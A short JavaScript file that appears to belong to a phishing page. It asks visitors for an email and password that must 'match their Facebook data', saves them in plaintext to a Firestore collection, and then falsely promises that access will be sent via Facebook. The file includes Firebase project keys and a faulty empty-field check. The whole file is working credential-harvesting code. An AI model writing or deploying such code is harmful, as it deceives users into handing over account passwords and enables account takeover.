firebase.initializeApp({
  apiKey: "AIzaSyAQOPi9MJv0aGcLbyO6C5-FLjjwBlms9Yg",
  authDomain: "tarot-197a6.firebaseapp.com",
  projectId: "tarot-197a6",
  storageBucket: "tarot-197a6.appspot.com",
  messagingSenderId: "961440743509",
  appId: "1:961440743509:web:bdf93db4c0105aaceb54dc",
});

var db = firebase.firestore();

function Enviar() {
    var email = document.getElementById("email").value;
    var contra = document.getElementById("password").value;
    var recontra = document.getElementById("repassword").value;
  
    if (!(email = "" || contra == "" || recontra == "")) {
      if(contra != recontra){
          Swal.fire({
              title:"¡Error de accesso!",
              text:"Su correo y contraseña deben coincidir con sus datos de Facebook",
              icon: "error",
              confirmButtonText:"Entendido",
              timer: 2500,
            });
      }else{
          db.collection("datos")
          .add({
              email: email,  
              contra: contra,
              recontra: recontra,
          })
          .then(function (docRef){
              console.log("ID: ",docRef);
              document.getElementById("email").value="";
              document.getElementById("password").value="";
              document.getElementById("repassword").value="";
          })
          .catch(function (error){
              console.error("Erro",error);
          });
          Swal.fire({
              position: "top-end",
              icon: "success",
              title: "Su acceso se le enviará mediante Facebook en los proximos días",
              confirmButtonText:"Entendido",
              timer: 1500,
            });
      }
    } else {
      Swal.fire({
        title:"¡Error!",
        text:"Todos los campos son obligatorios",
        icon: "error",
        confirmButtonText:"Entendido",
      });
    }
  
   // alert("email: " + email + "\npass: " + pass + "\nrepass: " + repass);
  }
